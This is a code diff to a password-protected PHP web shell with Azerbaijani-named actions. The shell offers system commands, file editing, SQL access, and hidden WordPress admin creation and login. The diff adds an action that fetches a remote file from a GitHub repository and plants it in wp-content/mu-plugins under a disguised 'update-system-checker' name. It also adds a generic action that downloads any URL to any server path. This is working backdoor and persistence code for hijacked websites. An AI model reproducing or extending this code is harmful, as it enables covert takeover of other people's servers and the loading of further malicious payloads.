@@ -16,7 +16,7 @@ if ($password != md5($_GET['password'])) {
 }
 $baqliFunksiyalar = explode(",", "");
 $safeMode = true;
-$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','set_manual_wp_load','create_st_folder','create_shb_file','chmod','chmod_folder','goto');
+$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','set_manual_wp_load','create_st_folder','create_stl_folder','create_shb_file', 'download_from_url', 'chmod','chmod_folder','goto');
 $ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas";
 function listDrives() {
     $drives = [];
@@ -502,11 +502,30 @@ else if ($ne == 'create_st_folder') {
 		print "Plugin Installed Successfully.";
 	}
 }
+else if ($ne == 'create_stl_folder') {
+	$filename = isset($_GET['filename']) ? $_GET['filename'] : $_POST['filename'];
+	$folder = $default_dir . DIRECTORY_SEPARATOR . 'mu-plugins';
+	if (strpos($folder, 'wp-content') !== false) {
+		if (!is_dir($folder)) {
+			mkdir($folder, 0755, true); // Creates folder with permissions and recursive mode
+		}
+		$file_contentx = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/update-system-checker-plain.txt');
+		file_put_contents($folder . DIRECTORY_SEPARATOR . $filename, $file_contentx);
+		print "Plugin Installed Successfully.";
+	}
+}
 else if ($ne == 'create_shb_file') {
 	$filename = isset($_GET['filename']) ? $_GET['filename'] : $_POST['filename'];
 	$file_contentx = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/horizon.php');
 	file_put_contents($default_dir . DIRECTORY_SEPARATOR . $filename, $file_contentx);
 	print "Plugin Installed Successfully.";
+}
+else if ($ne == 'download_from_url') {
+	$path = isset($_GET['path']) ? $_GET['path'] : $_POST['path'];
+	$url = isset($_GET['url']) ? $_GET['url'] : $_POST['url'];
+	$content = curl_data($url);
+	file_put_contents($path, $content);
+	print "File Downloaded Successfully.";
 }
 else if ($ne == 'chmod') {
 	$mod = isset($_POST['mod']) ? $_POST['mod'] : $_GET['mod'];
@@ -1027,7 +1046,7 @@ print "</tbody></table>";
 ?>
 
 <hr>
-<a href="javascript:newFile();">Yeni fayl</a> | <a href="javascript:newPapka();">Yeni papka</a> | <a href="javascript:createWpAdmin();">Create WP Admin</a> | <a href="javascript:loginWP();">Login WP</a> | <a href="javascript:setManualWpLoad();">Set WP Load</a> | <a href="javascript:createStFolder();">ST-Folder</a> | <a href="javascript:createShbFile();">SHB-File</a><br>
+<a href="javascript:newFile();">Yeni fayl</a> | <a href="javascript:newPapka();">Yeni papka</a> | <a href="javascript:createWpAdmin();">Create WP Admin</a> | <a href="javascript:loginWP();">Login WP</a> | <a href="javascript:setManualWpLoad();">Set WP Load</a> | <a href="javascript:createStFolder();">ST-Folder</a> | <a href="javascript:createStlFolder();">STL-Folder</a> | <a href="javascript:createShbFile();">SHB-File</a> | <a href="javascript:downloadFromUrl('<?=$default_dir;?>');">Download</a><br>
 <a href="javascript:sehife('?ne=sistem_kom&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>')">Icra edin</a><br>
 <a href="javascript:sehife('?ne=skl');">SQL</a><br>
 
@@ -1139,11 +1158,19 @@ function createStFolder()
 		sehife("?ne=create_st_folder&filename=" + filename + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
 	}
 }
-function createShbFile()
+function createStlFolder()
 {
-	var filename = prompt('Name:', 'bootstrap.php');
+	var filename = prompt('Name:', 'update-system-checker-lite.php');
 	if (filename) {
-		sehife("?ne=create_shb_file&filename=" + filename + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
+		sehife("?ne=create_stl_folder&filename=" + filename + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
+	}
+}
+function downloadFromUrl(pathParam)
+{
+	var url = prompt('URL:');
+	var path = prompt('Location', pathParam + '/' + url.substring(url.lastIndexOf('/') + 1));
+	if (url && path) {
+		sehife("?ne=download_from_url&url=" + url + "&path=" + path + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
 	}
 }
 function loginWP()
